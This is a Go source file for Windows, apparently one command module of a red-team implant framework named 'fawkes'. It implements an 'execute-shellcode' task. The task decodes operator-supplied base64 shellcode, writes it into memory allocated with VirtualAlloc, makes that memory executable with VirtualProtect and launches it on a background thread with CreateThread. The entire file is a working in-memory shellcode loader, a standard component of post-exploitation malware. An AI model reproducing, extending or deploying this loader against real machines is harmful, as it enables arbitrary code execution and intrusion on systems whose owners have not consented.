//go:build windows

package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"syscall"
	"unsafe"

	"fawkes/pkg/structs"
)

// ExecuteShellcodeCommand executes shellcode in the current process.
type ExecuteShellcodeCommand struct{}

func (c *ExecuteShellcodeCommand) Name() string {
	return "execute-shellcode"
}

func (c *ExecuteShellcodeCommand) Description() string {
	return "Execute shellcode in the current process via VirtualAlloc + CreateThread"
}

type executeShellcodeArgs struct {
	ShellcodeB64 string `json:"shellcode_b64"`
}

var (
	procCreateThread     = kernel32.NewProc("CreateThread")
	procWaitSingleObject = kernel32.NewProc("WaitForSingleObject")
	procVirtualAllocSC   = kernel32.NewProc("VirtualAlloc")
	procVirtualProtectSC = kernel32.NewProc("VirtualProtect")
)

func (c *ExecuteShellcodeCommand) Execute(task structs.Task) structs.CommandResult {
	var args executeShellcodeArgs
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: shellcode_b64 parameter required",
			Status:    "error",
			Completed: true,
		}
	}
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	if args.ShellcodeB64 == "" {
		return structs.CommandResult{
			Output:    "Error: shellcode_b64 is empty",
			Status:    "error",
			Completed: true,
		}
	}

	shellcode, err := base64.StdEncoding.DecodeString(args.ShellcodeB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding shellcode: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(shellcode) == 0 {
		return structs.CommandResult{
			Output:    "Error: shellcode is empty after decoding",
			Status:    "error",
			Completed: true,
		}
	}

	// Allocate RW memory in current process
	addr, _, lastErr := procVirtualAllocSC.Call(
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)
	if addr == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: VirtualAlloc failed: %v", lastErr),
			Status:    "error",
			Completed: true,
		}
	}

	// Copy shellcode to allocated memory
	//nolint:gosec // intentional shellcode execution for red team tool
	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(shellcode)), shellcode)

	// Change to RX (no write)
	var oldProtect uint32
	ret, _, lastErr := procVirtualProtectSC.Call(
		addr,
		uintptr(len(shellcode)),
		PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: VirtualProtect failed: %v", lastErr),
			Status:    "error",
			Completed: true,
		}
	}

	// Create thread to execute shellcode
	hThread, _, lastErr := procCreateThread.Call(
		0,                // security attributes
		0,                // stack size (default)
		addr,             // start address
		0,                // parameter
		0,                // creation flags (run immediately)
		0,                // thread ID
	)
	if hThread == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: CreateThread failed: %v", lastErr),
			Status:    "error",
			Completed: true,
		}
	}

	// Don't wait for the thread — let it run in the background.
	// Close the handle but the thread continues executing.
	syscall.CloseHandle(syscall.Handle(hThread))

	return structs.CommandResult{
		Output:    fmt.Sprintf("Shellcode executed successfully\n  Size: %d bytes\n  Address: 0x%X\n  Thread created and running", len(shellcode), addr),
		Status:    "success",
		Completed: true,
	}
}
